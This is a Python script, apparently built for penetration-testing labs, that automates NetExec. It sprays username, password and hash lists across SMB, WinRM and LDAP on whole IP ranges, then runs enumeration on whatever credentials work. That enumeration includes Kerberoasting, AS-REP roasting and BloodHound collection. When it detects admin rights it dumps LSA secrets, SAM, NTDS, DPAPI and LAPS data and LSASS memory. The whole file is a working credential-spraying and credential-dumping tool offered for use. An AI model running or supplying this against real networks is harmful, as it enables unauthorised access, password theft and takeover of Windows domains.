#!/usr/bin/env python3

import subprocess
import sys
import os
import argparse
from datetime import datetime
import json
import itertools
import ipaddress
from collections import defaultdict

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Available protocols in NetExec
PROTOCOLS = ['ssh', 'mssql', 'smb', 'winrm', 'wmi', 'ldap', 'vnc', 'ftp', 'rdp']

# Protocols to use for initial credential validation
VALIDATION_PROTOCOLS = ['smb', 'winrm', 'ldap']

def get_enum_params(target, username):
    """Get enumeration parameters for protocols, with target-specific commands"""
    return {
        'smb': [
            ['--shares'],
            ['--users'],
            ['--groups'],
            ['--computer'],
            ['--loggedon-users'],
            ['--sessions'],
            ['-M', 'spider_plus'],
            ['-x', 'net user'],
        ],
        'ssh': [
            ['--key-exchange'],
            ['--check']
        ],
        'mssql': [
            ['-x', 'net localgroup administrators'],
            ['-x', 'whoami /priv'],
            ['--users'],
            ['--passwords']
        ],
        'winrm': [
            ['-x', 'net localgroup administrators'],
            ['-x', 'whoami /priv'],
            ['-x', 'net user'],
            ['-x', 'net user', username],
            ['-x', 'wmic useraccount get name,sid']
        ],
        'wmi': [
            ['-x', 'whoami']
        ],
        'ldap': [
            ['--users'],
            ['--groups'],
            ['--password-not-required'],
            ['-M', 'pre2k'],
            ['--admin-count'],
            ['--bloodhound', '--dns-server', target, '--collection', 'All'],
            ['--kerberoasting', 'kerberoasting.txt'],
            ['--asreproast', 'asrep.txt']
        ],
        'vnc': [],
        'ftp': [
            ['--ls']
        ],
        'rdp': [],
    }

def get_admin_modules(target, username):
    """Get additional modules for admin users (when Pwn3d! is detected)"""
    return {
        'smb': [
            ['--lsa'],
            ['--sam'],
            ['--ntds'],
            ['--ntds', 'vss'],
            ['--dpapi'],
            ['-M', 'lsassy'],
            ['--laps']
        ],
        'mssql': [
            ['-x', 'whoami /priv'],
        ],
        'winrm': [
            ['-x', 'whoami /priv'],
            ['-x', 'net user', username]
        ],
        'wmi': [
            ['-x', 'whoami /priv'],
            ['-x', 'net user'],
        ],
        'ssh': [
            ['--key-exchange'],
            ['-x', 'sudo -l'],
            ['-x', 'id'],
            ['-x', 'cat /etc/passwd']
        ],
        'ldap': [
            ['--bloodhound', '--dns-server', target, '--collection', 'All'],
            ['-M', 'adcs'],
            ['-M', 'get-desc-users'],
        ],
        'vnc': [],
        'rdp': [],
    }

# Additional modules for null authentication
NULL_AUTH_MODULES = {
    'smb': [
        ['--rid-brute']
    ],
    'ldap': [
        ['--users'],
        ['--groups'],
        ['--computer'],
        ['--password-not-required']
    ],
    'mssql': [
        ['--users']
    ],
    'winrm': [],
    'wmi': [],
    'ssh': [],
    'vnc': [],
    'ftp': [
        ['--ls']
    ],
    'rdp': [],
}

def print_colored(text, color):
    """Print text with color"""
    print(f"{color}{text}{Colors.RESET}")

def print_success(text):
    """Print success message in green"""
    print_colored(f"[+] {text}", Colors.GREEN)

def print_info(text):
    """Print info message in blue"""
    print_colored(f"[*] {text}", Colors.BLUE)

def print_error(text):
    """Print error message in red"""
    print_colored(f"[-] {text}", Colors.RED)

def print_warning(text):
    """Print warning message in yellow"""
    print_colored(f"[!] {text}", Colors.YELLOW)

def print_admin(text):
    """Print admin privilege message in magenta"""
    print_colored(f"[!] {text}", Colors.MAGENTA + Colors.BOLD)

def parse_targets(target_input):
    """Parse target input - can be IP, CIDR, comma-separated IPs, or file"""
    targets = []
    
    if os.path.isfile(target_input):
        # Read from file
        try:
            with open(target_input, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.extend(parse_targets(line))
        except Exception as e:
            print_error(f"Error reading targets file: {e}")
            sys.exit(1)
    else:
        # Check if it contains commas (comma-separated list)
        if ',' in target_input:
            ip_list = [ip.strip() for ip in target_input.split(',')]
            for ip in ip_list:
                if ip:  # Skip empty strings
                    targets.extend(parse_targets(ip))
        else:
            # Check if it's CIDR notation
            try:
                network = ipaddress.ip_network(target_input, strict=False)
                if network.num_addresses > 1:
                    targets = [str(ip) for ip in network.hosts()]
                else:
                    targets = [str(network.network_address)]
            except ValueError:
                # Single IP
                try:
                    ipaddress.ip_address(target_input)
                    targets = [target_input]
                except ValueError:
                    print_error(f"Invalid IP address or CIDR notation: {target_input}")
                    sys.exit(1)
    
    return targets

def load_wordlist(filename):
    """Load a wordlist from file"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print_error(f"Wordlist file '{filename}' not found")
        sys.exit(1)
    except Exception as e:
        print_error(f"Error reading wordlist '{filename}': {str(e)}")
        sys.exit(1)

def load_hashlist(filename):
    """Load a hash list from file - supports various hash formats"""
    try:
        hashes = []
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Handle different hash formats
                    if ':' in line:
                        # Format: username:hash or user:id:hash
                        parts = line.split(':')
                        if len(parts) >= 2:
                            # Take the last part as hash (handles user:id:hash format)
                            hash_val = parts[-1]
                            if hash_val:
                                hashes.append(hash_val)
                    else:
                        # Just the hash
                        hashes.append(line)
        
        print_info(f"Loaded {len(hashes)} hashes from {filename}")
        return hashes
    except FileNotFoundError:
        print_error(f"Hash file '{filename}' not found")
        sys.exit(1)
    except Exception as e:
        print_error(f"Error reading hash file '{filename}': {str(e)}")
        sys.exit(1)

def run_netexec_command(protocol, target, username, password, hash_val=None, additional_params=None, local_auth=False):
    """Run a NetExec command and return the result"""
    cmd = ['netexec', protocol, target]
    
    # Add local auth flag if specified
    if local_auth:
        cmd.append('--local-auth')
    
    # Add credentials if provided
    if username:
        if hash_val:
            cmd.extend(['-u', username, '-H', hash_val])
        elif password:
            cmd.extend(['-u', username, '-p', password])
        else:
            cmd.extend(['-u', username, '-p', ''])
    else:
        # Try null authentication
        cmd.extend(['-u', '', '-p', ''])
    
    # Add additional parameters
    if additional_params:
        cmd.extend(additional_params)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)

def check_netexec_installed():
    """Check if NetExec is installed"""
    try:
        subprocess.run(['netexec', '--help'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def is_successful_connection(returncode, stdout, stderr):
    """Determine if the connection was successful based on output"""
    if returncode == 0:
        # Look for success indicators in stdout
        success_indicators = [
            '[+]',
            'STATUS_SUCCESS',
            'STATUS_LOGON_SUCCESS', 
            'Login successful',
            'Authentication successful',
            'Connected to',
            'Logged in as'
        ]
        for indicator in success_indicators:
            if indicator in stdout:
                return True
    return False

def is_admin_user(stdout):
    """Check if the user has admin privileges (Pwn3d! indicator)"""
    return 'Pwn3d!' in stdout

def build_command_string(protocol, target, username, password, hash_val, additional_params=None, local_auth=False):
    """Build command string for logging"""
    cmd = f"netexec {protocol} {target}"
    
    if local_auth:
        cmd += " --local-auth"
    
    if username:
        cmd += f" -u {username}"
        if hash_val:
            cmd += f" -H {hash_val}"
        elif password:
            cmd += f" -p '{password}'"
        else:
            cmd += " -p ''"
    else:
        cmd += " -u '' -p ''"
    
    if additional_params:
        cmd += f" {' '.join(additional_params)}"
    
    return cmd

def log_results(filename, protocol, target, username, password, hash_val, output, command=None, local_auth=False):
    """Log results to file"""
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"Protocol: {protocol}\n")
        f.write(f"Target: {target}\n")
        f.write(f"Username: {username if username else 'null'}\n")
        if hash_val:
            f.write(f"Hash: {hash_val}\n")
        else:
            f.write(f"Password: {password if password else 'null'}\n")
        if local_auth:
            f.write(f"Local Auth: Yes\n")
        if command:
            f.write(f"Command: {command}\n")
        f.write(f"Output:\n{output}\n")

def validate_credentials(targets, usernames, passwords, hashes, local_auth=False):
    """Validate credentials across multiple targets using SMB, WinRM, and LDAP with --continue-on-success"""
    print_info("Starting credential validation phase...")
    print_info(f"Testing {len(usernames)} usernames against {len(targets)} targets")
    
    valid_credentials = defaultdict(list)  # target -> [(username, password/hash, protocol, is_admin)]
    
    # Create all credential combinations
    all_creds = []
    
    # Password combinations
    if passwords:
        for username in usernames:
            for password in passwords:
                all_creds.append((username, password, None, 'password'))
    
    # Hash combinations
    if hashes:
        for username in usernames:
            for hash_val in hashes:
                all_creds.append((username, None, hash_val, 'hash'))
    
    print_info(f"Total credential combinations to test: {len(all_creds)}")
    
    # Test each protocol for credential validation
    for protocol in VALIDATION_PROTOCOLS:
        print_colored(f"\n[*] Validating credentials using {protocol.upper()} protocol...", Colors.BLUE + Colors.BOLD)
        
        if not all_creds:
            print_warning("No credentials to test")
            continue
            
        # Prepare command for batch credential testing
        for target in targets:
            print_info(f"Testing {protocol.upper()} on {target}")
            
            # Create temporary files for batch testing
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
            temp_user_file = f"/tmp/users_{timestamp}.txt"
            temp_pass_file = f"/tmp/passwords_{timestamp}.txt" if passwords else None
            temp_hash_file = f"/tmp/hashes_{timestamp}.txt" if hashes else None
            
            try:
                # Write usernames to temp file
                with open(temp_user_file, 'w') as f:
                    for username in usernames:
                        f.write(f"{username}\n")
                
                # Test with passwords if available
                if passwords and temp_pass_file:
                    with open(temp_pass_file, 'w') as f:
                        for password in passwords:
                            f.write(f"{password}\n")
                    
                    cmd = ['netexec', protocol, target, '-u', temp_user_file, '-p', temp_pass_file, '--continue-on-success']
                    if local_auth:
                        cmd.append('--local-auth')
                    
                    print_info(f"Running batch password validation: netexec {protocol} {target} -u {temp_user_file} -p {temp_pass_file} --continue-on-success")
                    
                    try:
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                        if result.stdout:
                            # Parse successful authentications
                            for line in result.stdout.split('\n'):
                                if '[+]' in line and not 'STATUS_LOGON_FAILURE' in line:
                                    # Look for credential patterns in NetExec output
                                    # Examples:
                                    # SMB: [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
                                    # LDAP: LDAP 10.10.140.140 389 DC01 [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
                                    try:
                                        # Find everything after [+] 
                                        plus_index = line.find('[+]')
                                        if plus_index != -1:
                                            after_plus = line[plus_index + 3:].strip()
                                            
                                            # Look for domain\username:credential pattern
                                            if ':' in after_plus:
                                                # Split on the last colon to separate user and credential
                                                user_part, credential = after_plus.rsplit(':', 1)
                                                
                                                # Extract username (remove domain if present)
                                                if '\\' in user_part:
                                                    username = user_part.split('\\')[-1]
                                                else:
                                                    username = user_part
                                                
                                                # Clean up any extra whitespace or characters
                                                username = username.strip()
                                                credential = credential.strip()
                                                
                                                if username and credential:
                                                    is_admin = 'Pwn3d!' in line
                                                    valid_credentials[target].append((username, credential, None, protocol, is_admin))
                                                    print_success(f"Valid credential found: {username}:{credential} on {target} via {protocol.upper()}")
                                                    if is_admin:
                                                        print_admin(f"ADMIN privileges detected for {username}:{credential}")
                                    
                                    except Exception as e:
                                        print_warning(f"Could not parse credential line: {line.strip()}")
                                        print_warning(f"Parse error: {str(e)}")
                    except subprocess.TimeoutExpired:
                        print_warning(f"Batch password testing timed out for {protocol} on {target}")
                    except Exception as e:
                        print_error(f"Error during batch password testing: {e}")
                
                # Test with hashes if available
                if hashes and temp_hash_file:
                    with open(temp_hash_file, 'w') as f:
                        for hash_val in hashes:
                            f.write(f"{hash_val}\n")
                    
                    cmd = ['netexec', protocol, target, '-u', temp_user_file, '-H', temp_hash_file, '--continue-on-success']
                    if local_auth:
                        cmd.append('--local-auth')
                    
                    print_info(f"Running batch hash validation: netexec {protocol} {target} -u {temp_user_file} -H {temp_hash_file} --continue-on-success")
                    
                    try:
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                        if result.stdout:
                            # Parse successful authentications
                            for line in result.stdout.split('\n'):
                                if '[+]' in line and not 'STATUS_LOGON_FAILURE' in line:
                                    # Look for credential patterns in NetExec output
                                    # Examples:
                                    # SMB: [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
                                    # LDAP: LDAP 10.10.140.140 389 DC01 [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
                                    try:
                                        # Find everything after [+] 
                                        plus_index = line.find('[+]')
                                        if plus_index != -1:
                                            after_plus = line[plus_index + 3:].strip()
                                            
                                            # Look for domain\username:credential pattern
                                            if ':' in after_plus:
                                                # Split on the last colon to separate user and credential
                                                user_part, hash_val = after_plus.rsplit(':', 1)
                                                
                                                # Extract username (remove domain if present)
                                                if '\\' in user_part:
                                                    username = user_part.split('\\')[-1]
                                                else:
                                                    username = user_part
                                                
                                                # Clean up any extra whitespace or characters
                                                username = username.strip()
                                                hash_val = hash_val.strip()
                                                
                                                if username and hash_val:
                                                    is_admin = 'Pwn3d!' in line
                                                    valid_credentials[target].append((username, None, hash_val, protocol, is_admin))
                                                    print_success(f"Valid credential found: {username}:{hash_val[:16]}... on {target} via {protocol.upper()}")
                                                    if is_admin:
                                                        print_admin(f"ADMIN privileges detected for {username} with hash")
                                    
                                    except Exception as e:
                                        print_warning(f"Could not parse credential line: {line.strip()}")
                                        print_warning(f"Parse error: {str(e)}")
                    except subprocess.TimeoutExpired:
                        print_warning(f"Batch hash testing timed out for {protocol} on {target}")
                    except Exception as e:
                        print_error(f"Error during batch hash testing: {e}")
            
            finally:
                # Clean up temporary files
                for temp_file in [temp_user_file, temp_pass_file, temp_hash_file]:
                    if temp_file and os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                        except:
                            pass
    
    # Remove duplicates and organize results
    unique_credentials = defaultdict(set)
    for target in valid_credentials:
        for username, password, hash_val, protocol, is_admin in valid_credentials[target]:
            cred_key = (username, password, hash_val, is_admin)
            unique_credentials[target].add(cred_key)
    
    # Convert back to list format
    final_credentials = defaultdict(list)
    for target in unique_credentials:
        for username, password, hash_val, is_admin in unique_credentials[target]:
            final_credentials[target].append((username, password, hash_val, is_admin))
    
    print_colored(f"\n[*] Credential validation completed!", Colors.BOLD + Colors.GREEN)
    total_valid = sum(len(creds) for creds in final_credentials.values())
    print_info(f"Found {total_valid} valid credential pairs across {len(final_credentials)} targets")
    
    return final_credentials

def run_enumeration(protocol, target, username, password, hash_val, output_file, local_auth=False):
    """Run enumeration for a successful credential pair"""
    print_info(f"Running enumeration for {protocol.upper()} on {target} with {username}:{password if password else '[hash]'}")
    
    # Get protocol-specific parameters with target
    enum_params = get_enum_params(target, username)
    admin_modules = get_admin_modules(target, username)
    
    # Initial connection test and logging
    returncode, stdout, stderr = run_netexec_command(protocol, target, username, password, hash_val, local_auth=local_auth)
    initial_cmd = build_command_string(protocol, target, username, password, hash_val, local_auth=local_auth)
    
    enumeration_results = []
    
    if is_successful_connection(returncode, stdout, stderr):
        log_results(output_file, protocol, target, username, password, hash_val, stdout, initial_cmd, local_auth)
        enumeration_results.append({
            'command': initial_cmd,
            'output': stdout,
            'type': 'initial'
        })
        
        # Check for admin privileges and null auth
        is_admin = is_admin_user(stdout)
        is_null_auth = (not username or username == '') and (not password or password == '') and not hash_val
        
        if is_admin:
            print_admin(f"ADMIN PRIVILEGES DETECTED on {protocol.upper()}")
            
            # Run admin modules if available for this protocol
            if protocol in admin_modules:
                print_success(f"Running admin modules for {protocol.upper()}...")
                
                for param_group in admin_modules[protocol]:
                    param_str = ' '.join(param_group)
                    print_info(f"Running admin module: {param_str}...")
                    ret, out, err = run_netexec_command(protocol, target, username, password, hash_val, param_group, local_auth)
                    
                    admin_cmd = build_command_string(protocol, target, username, password, hash_val, param_group, local_auth)
                    
                    if ret == 0 and out:
                        print_success(f"Admin module results for {param_str}:")
                        print_colored(f"[+] Command: {admin_cmd}", Colors.CYAN)
                        print(out)
                        print_colored("="*50, Colors.WHITE)
                        log_results(output_file, f"{protocol}_{param_str.replace(' ', '_')}", target, username, password, hash_val, out, admin_cmd, local_auth)
                        enumeration_results.append({
                            'command': admin_cmd,
                            'output': out,
                            'type': 'admin'
                        })
                    else:
                        print_error(f"No results for admin module {param_str}")
                        if err:
                            print_error(f"Error: {err}")
        
        if is_null_auth and protocol in NULL_AUTH_MODULES:
            print_success(f"Null authentication detected on {protocol.upper()}, running additional modules...")
            for param_group in NULL_AUTH_MODULES[protocol]:
                param_str = ' '.join(param_group)
                print_info(f"Running null auth module: {param_str}...")
                ret, out, err = run_netexec_command(protocol, target, username, password, hash_val, param_group, local_auth)
                
                null_cmd = build_command_string(protocol, target, username, password, hash_val, param_group, local_auth)
                
                if ret == 0 and out:
                    print_success(f"Null auth module results for {param_str}:")
                    print_colored(f"[+] Command: {null_cmd}", Colors.CYAN)
                    print(out)
                    log_results(output_file, f"{protocol}_{param_str.replace(' ', '_')}", target, username, password, hash_val, out, null_cmd, local_auth)
                    enumeration_results.append({
                        'command': null_cmd,
                        'output': out,
                        'type': 'null_auth'
                    })
                else:
                    print_error(f"No results for null auth module {param_str}")
        
        # Run standard enumeration commands for this protocol
        if protocol in enum_params:
            for param_group in enum_params[protocol]:
                param_str = ' '.join(param_group)
                print_info(f"Running enumeration with {param_str}...")
                ret, out, err = run_netexec_command(protocol, target, username, password, hash_val, param_group, local_auth)
                
                enum_cmd = build_command_string(protocol, target, username, password, hash_val, param_group, local_auth)
                
                if ret == 0 and out:
                    print_success(f"Enumeration results for {param_str}:")
                    print_colored(f"[+] Command: {enum_cmd}", Colors.CYAN)
                    print(out)
                    print_colored("="*50, Colors.WHITE)
                    log_results(output_file, f"{protocol}_{param_str.replace(' ', '_')}", target, username, password, hash_val, out, enum_cmd, local_auth)
                    enumeration_results.append({
                        'command': enum_cmd,
                        'output': out,
                        'type': 'enumeration'
                    })
                else:
                    print_error(f"No results for {param_str}")
                    if err:
                        print_error(f"Error: {err}")
    
    return enumeration_results

def extract_key_findings(output):
    """Extract key findings from NetExec output"""
    findings = []
    lines = output.split('\n')
    
    for line in lines:
        line = line.strip()
        if any(keyword in line.lower() for keyword in ['[+]', 'shares:', 'users:', 'groups:', 'admin', 'success', 'found']):
            if line and not line.startswith('netexec'):
                findings.append(line)
    
    return findings

def create_summary_report(all_results, summary_file):
    """Create a comprehensive summary report"""
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write("NETEXEC ENUMERATION SUMMARY REPORT\n")
        f.write("="*60 + "\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        for target in all_results:
            f.write(f"TARGET: {target}\n")
            f.write("-" * 40 + "\n")
            
            target_results = all_results[target]
            
            # Summary of successful protocols
            successful_protocols = list(target_results.keys())
            f.write(f"Successful Protocols: {', '.join(successful_protocols)}\n\n")
            
            # Detailed findings per protocol
            for protocol in successful_protocols:
                f.write(f"  {protocol.upper()}:\n")
                protocol_data = target_results[protocol]
                
                # Credentials
                if protocol_data.get('hash'):
                    f.write(f"    Credentials: {protocol_data['username']}:[hash]\n")
                else:
                    f.write(f"    Credentials: {protocol_data['username']}:{protocol_data['password']}\n")
                
                if protocol_data.get('is_admin'):
                    f.write(f"    Admin Privileges: YES\n")
                
                # Key findings
                all_findings = set()
                for result in protocol_data['enumeration_results']:
                    findings = extract_key_findings(result['output'])
                    all_findings.update(findings)
                
                if all_findings:
                    f.write(f"    Key Findings:\n")
                    for finding in sorted(all_findings):
                        f.write(f"      - {finding}\n")
                else:
                    f.write(f"    No significant findings\n")
                
                f.write("\n")
            
            f.write("\n")

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='NetExec Lab Enumeration Script - Enhanced Edition v2.0')
    parser.add_argument('-H', '--hash', help='Hash value or path to hash file for authentication')
    parser.add_argument('-u', '--user', help='Username or path to username wordlist')
    parser.add_argument('-p', '--pass', dest='password', help='Password or path to password wordlist')
    parser.add_argument('-i', '--ip', help='Target IP address(es): single IP, comma-separated IPs, CIDR notation, or file with targets')
    parser.add_argument('--local', action='store_true', help='Use local authentication (--local-auth)')
    parser.add_argument('--validate-only', action='store_true', help='Only validate credentials, skip full enumeration')
    args = parser.parse_args()
    
    print_colored("NetExec Lab Enumeration Script - Enhanced Edition v2.0", Colors.BOLD + Colors.CYAN)
    print_colored("=" * 70, Colors.CYAN)
    print()
    
    # Check if NetExec is installed
    if not check_netexec_installed():
        print_error("NetExec is not installed or not in PATH")
        print_colored("Install with: pip install netexec", Colors.YELLOW)
        sys.exit(1)
    
    # Get targets
    if args.ip:
        targets = parse_targets(args.ip)
    else:
        target_input = input("Enter target IP address(es), CIDR, or file path: ").strip()
        if not target_input:
            print_error("Target input is required")
            sys.exit(1)
        targets = parse_targets(target_input)
    
    print_info(f"Total targets to scan: {len(targets)}")
    print_info(f"Targets: {', '.join(targets[:5])}{'...' if len(targets) > 5 else ''}")
    
    # Parse authentication credentials
    usernames = []
    passwords = []
    hashes = []
    
    # Handle usernames
    if args.user:
        if os.path.isfile(args.user):
            usernames = load_wordlist(args.user)
            print_info(f"Loaded {len(usernames)} usernames from file")
        else:
            usernames = [args.user]
    else:
        username_input = input("Enter username or path to username file: ").strip()
        if os.path.isfile(username_input):
            usernames = load_wordlist(username_input)
        elif username_input:
            usernames = [username_input]
        else:
            usernames = ['']  # Empty username for null auth
    
    # Handle passwords
    if args.password:
        if os.path.isfile(args.password):
            passwords = load_wordlist(args.password)
            print_info(f"Loaded {len(passwords)} passwords from file")
        else:
            passwords = [args.password]
    elif not args.hash:  # Only ask for password if no hash provided
        password_input = input("Enter password or path to password file (press Enter for null): ").strip()
        if os.path.isfile(password_input):
            passwords = load_wordlist(password_input)
        elif password_input:
            passwords = [password_input]
        else:
            passwords = ['']  # Empty password for null auth
    
    # Handle hashes
    if args.hash:
        if os.path.isfile(args.hash):
            hashes = load_hashlist(args.hash)
            print_info(f"Loaded {len(hashes)} hashes from file")
        else:
            hashes = [args.hash]
    
    # Validate we have some form of authentication
    if not usernames:
        print_error("No usernames provided")
        sys.exit(1)
    
    if not passwords and not hashes:
        print_warning("No passwords or hashes provided - will attempt null authentication")
        passwords = ['']
    
    # Determine operation mode
    spray_mode = (len(usernames) > 1 or len(passwords) > 1 or len(hashes) > 1)
    
    if spray_mode:
        print_info("Multi-credential testing mode enabled")
        print_info(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}, Hashes: {len(hashes)}")
    else:
        print_info("Single credential mode")
    
    # Create output filenames
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = f"netexec_results_{timestamp}.txt"
    summary_file = f"netexec_summary_{timestamp}.txt"
    
    print_info(f"Starting enumeration of {len(targets)} targets")
    if args.local:
        print_warning("Using local authentication mode")
    print_info(f"Detailed results will be saved to: {output_file}")
    print_info(f"Summary will be saved to: {summary_file}")
    print_colored("=" * 70, Colors.CYAN)
    
    all_results = {}
    
    if spray_mode and len(targets) > 0:
        # Phase 1: Credential validation using batch mode with --continue-on-success
        print_colored("\n=== PHASE 1: CREDENTIAL VALIDATION ===", Colors.BOLD + Colors.YELLOW)
        valid_credentials = validate_credentials(targets, usernames, passwords, hashes, args.local)
        
        if not valid_credentials:
            print_error("No valid credentials found during validation phase")
            if not args.validate_only:
                print_warning("Proceeding with single credential testing on all protocols...")
        else:
            print_success(f"Credential validation completed - found valid credentials for {len(valid_credentials)} targets")
        
        if args.validate_only:
            print_info("Validation-only mode enabled, skipping full enumeration")
            # Create summary for validation results
            validation_summary = {}
            for target in valid_credentials:
                validation_summary[target] = {}
                for username, password, hash_val, is_admin in valid_credentials[target]:
                    key = f"validated_creds"
                    if key not in validation_summary[target]:
                        validation_summary[target][key] = {
                            'username': username,
                            'password': password,
                            'hash': hash_val,
                            'is_admin': is_admin,
                            'enumeration_results': []
                        }
            
            create_summary_report(validation_summary, summary_file)
            print_success(f"Validation summary saved to: {summary_file}")
            return
        
        # Phase 2: Full enumeration on valid credentials
        if valid_credentials:
            print_colored("\n=== PHASE 2: FULL ENUMERATION ON VALID CREDENTIALS ===", Colors.BOLD + Colors.YELLOW)
            
            for target in valid_credentials:
                print_colored(f"\n[*] Running full enumeration on target: {target}", Colors.BOLD + Colors.WHITE)
                target_results = {}
                
                # Test each protocol with valid credentials
                for username, password, hash_val, is_admin in valid_credentials[target]:
                    cred_str = f"{username}:{password if password else '[hash]'}"
                    print_info(f"Testing protocols with credential: {cred_str}")
                    
                    for protocol in PROTOCOLS:
                        print_colored(f"\n[*] Testing {protocol.upper()} protocol with {cred_str}...", Colors.BLUE)
                        
                        returncode, stdout, stderr = run_netexec_command(protocol, target, username, password, hash_val, local_auth=args.local)
                        
                        if is_successful_connection(returncode, stdout, stderr):
                            print_success(f"SUCCESS: {protocol.upper()} connection established!")
                            
                            # Run full enumeration
                            enumeration_results = run_enumeration(protocol, target, username, password, hash_val, output_file, args.local)
                            
                            protocol_key = f"{protocol}_{username}"
                            target_results[protocol_key] = {
                                'username': username,
                                'password': password,
                                'hash': hash_val,
                                'is_admin': is_admin_user(stdout),
                                'enumeration_results': enumeration_results
                            }
                        else:
                            print_error(f"FAILED: {protocol.upper()} connection failed with {cred_str}")
                            if stderr:
                                print_error(f"Error: {stderr}")
                
                if target_results:
                    all_results[target] = target_results
        
        # Fallback: Test remaining targets with single credential mode if no valid creds found
        remaining_targets = [t for t in targets if t not in valid_credentials]
        if remaining_targets:
            print_colored(f"\n=== TESTING REMAINING {len(remaining_targets)} TARGETS ===", Colors.BOLD + Colors.YELLOW)
            
            # Use first credential combination for fallback testing
            test_username = usernames[0] if usernames else ''
            test_password = passwords[0] if passwords else ''
            test_hash = hashes[0] if hashes else None
            
            for target in remaining_targets:
                print_colored(f"\n[*] Processing target: {target}", Colors.BOLD + Colors.WHITE)
                target_results = {}
                
                for protocol in PROTOCOLS:
                    print_colored(f"\n[*] Testing {protocol.upper()} protocol on {target}...", Colors.BLUE + Colors.BOLD)
                    
                    returncode, stdout, stderr = run_netexec_command(protocol, target, test_username, test_password, test_hash, local_auth=args.local)
                    
                    if is_successful_connection(returncode, stdout, stderr):
                        print_success(f"SUCCESS: {protocol.upper()} connection established!")
                        
                        # Run full enumeration
                        enumeration_results = run_enumeration(protocol, target, test_username, test_password, test_hash, output_file, args.local)
                        target_results[protocol] = {
                            'username': test_username,
                            'password': test_password,
                            'hash': test_hash,
                            'is_admin': is_admin_user(stdout),
                            'enumeration_results': enumeration_results
                        }
                    else:
                        print_error(f"FAILED: {protocol.upper()} connection failed")
                        if stderr:
                            print_error(f"Error: {stderr}")
                
                if target_results:
                    all_results[target] = target_results
    
    else:
        # Single credential mode or single target
        print_colored("\n=== SINGLE CREDENTIAL/TARGET MODE ===", Colors.BOLD + Colors.YELLOW)
        
        test_username = usernames[0] if usernames else ''
        test_password = passwords[0] if passwords else ''
        test_hash = hashes[0] if hashes else None
        
        for target_idx, target in enumerate(targets):
            print_colored(f"\n[*] Processing target {target_idx + 1}/{len(targets)}: {target}", Colors.BOLD + Colors.WHITE)
            
            target_results = {}
            
            # Test each protocol
            for protocol in PROTOCOLS:
                print_colored(f"\n[*] Testing {protocol.upper()} protocol on {target}...", Colors.BLUE + Colors.BOLD)
                
                returncode, stdout, stderr = run_netexec_command(protocol, target, test_username, test_password, test_hash, local_auth=args.local)
                
                if is_successful_connection(returncode, stdout, stderr):
                    print_success(f"SUCCESS: {protocol.upper()} connection established!")
                    
                    # Run full enumeration
                    enumeration_results = run_enumeration(protocol, target, test_username, test_password, test_hash, output_file, args.local)
                    target_results[protocol] = {
                        'username': test_username,
                        'password': test_password,
                        'hash': test_hash,
                        'is_admin': is_admin_user(stdout),
                        'enumeration_results': enumeration_results
                    }
                else:
                    print_error(f"FAILED: {protocol.upper()} connection failed")
                    if stderr:
                        print_error(f"Error: {stderr}")
            
            # Store results for this target
            if target_results:
                all_results[target] = target_results
    
    # Create summary report
    create_summary_report(all_results, summary_file)
    
    # Final summary
    print_colored("\n" + "=" * 70, Colors.CYAN)
    print_colored("FINAL ENUMERATION SUMMARY", Colors.BOLD + Colors.CYAN)
    print_colored("=" * 70, Colors.CYAN)
    
    total_successful = 0
    total_admin = 0
    
    for target in all_results:
        successful_protocols = list(all_results[target].keys())
        total_successful += len(successful_protocols)
        
        if successful_protocols:
            print_success(f"{target}: {', '.join([p.split('_')[0] for p in successful_protocols])}")
            
            print_colored("  Credentials:", Colors.YELLOW)
            for protocol_key in successful_protocols:
                protocol_data = all_results[target][protocol_key]
                protocol_name = protocol_key.split('_')[0]
                
                if protocol_data.get('hash'):
                    cred_display = f"{protocol_data['username']}:[hash]"
                else:
                    cred_display = f"{protocol_data['username']}:{protocol_data['password']}"
                
                admin_status = ""
                if protocol_data.get('is_admin'):
                    admin_status = " (ADMIN)"
                    total_admin += 1
                
                print_colored(f"    {protocol_name.upper()}: {cred_display}{admin_status}", Colors.GREEN)
        else:
            print_error(f"{target}: No successful connections")
    
    print_info(f"Total targets scanned: {len(targets)}")
    print_info(f"Total successful connections: {total_successful}")
    print_info(f"Total admin privileges found: {total_admin}")
    print_success(f"Detailed results saved to: {output_file}")
    print_success(f"Summary report saved to: {summary_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_warning("\nScript interrupted by user")
        sys.exit(1)
    except Exception as e:
        print_error(f"An error occurred: {str(e)}")
        sys.exit(1)
